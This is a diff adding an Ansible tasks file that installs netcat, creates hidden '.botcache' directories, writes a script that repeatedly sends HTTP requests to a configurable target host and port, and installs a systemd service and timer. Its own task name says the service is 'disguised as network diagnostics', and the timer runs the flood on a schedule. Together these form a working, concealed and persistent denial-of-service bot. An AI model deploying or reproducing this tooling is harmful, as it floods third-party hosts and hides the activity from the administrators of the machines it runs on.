@@ -1,0 +1,82 @@
+---
+- name: Install netcat
+  apt:
+    name: netcat-openbsd
+    state: present
+    update_cache: yes
+
+- name: Ensure bot cache directories exist
+  file:
+    path: "{{ item }}"
+    state: directory
+    owner: root
+    group: root
+    mode: "0755"
+  loop:
+    - /usr/local/lib/.botcache
+    - /var/lib/.botcache
+
+- name: Create flood script
+  copy:
+    dest: "{{ flood_script_path }}"
+    owner: root
+    group: root
+    mode: "0755"
+    content: |
+      #!/bin/sh
+      set -eu
+
+      LOG="{{ flood_log }}"
+      COUNT={{ flood_count | int }}
+      i=0
+
+      echo "---- $(date) flood run ----" >> "$LOG"
+      while [ "$i" -lt "$COUNT" ]; do
+        printf "GET / HTTP/1.0\r\nHost: {{ flood_target_host }}\r\n\r\n" \
+          | nc -w 2 {{ flood_target_host | quote }} {{ flood_target_port | int }} >> "$LOG" 2>&1 || true
+        i=$((i + 1))
+      done
+      echo "sent $COUNT packets to {{ flood_target_host }}:{{ flood_target_port }}" >> "$LOG"
+
+- name: Create flood systemd service (disguised as network diagnostics)
+  copy:
+    dest: "/etc/systemd/system/{{ flood_service_unit }}"
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=Network Diagnostics Probe
+      After=network-online.target
+      Wants=network-online.target
+
+      [Service]
+      Type=oneshot
+      ExecStart={{ flood_script_path }}
+
+      [Install]
+      WantedBy=multi-user.target
+
+- name: Create flood systemd timer
+  copy:
+    dest: "/etc/systemd/system/{{ flood_timer_unit }}"
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=Periodic network diagnostics probe
+
+      [Timer]
+      OnCalendar={{ flood_schedule }}
+      Persistent=true
+
+      [Install]
+      WantedBy=timers.target
+
+- name: Enable and start flood timer
+  systemd:
+    name: "{{ flood_timer_unit }}"
+    enabled: yes
+    state: started
+    daemon_reload: yes
